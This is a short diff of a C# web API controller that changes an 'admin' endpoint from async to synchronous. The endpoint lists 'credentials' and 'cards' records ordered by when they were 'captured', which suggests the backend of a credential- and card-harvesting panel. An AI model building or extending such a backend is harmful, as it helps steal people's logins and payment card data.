@@ -46,7 +46,7 @@ public class LogController(AppDbContext db) : ControllerBase
     }
 
     [HttpGet("admin")]
-    public async Task<IActionResult> GetAll()
+    public IActionResult GetAll()
     {
         var credentials = db.LogEntries.OrderByDescending(x => x.CapturedAt).ToList();
         var cards = db.CardEntries.OrderByDescending(x => x.CapturedAt).ToList();
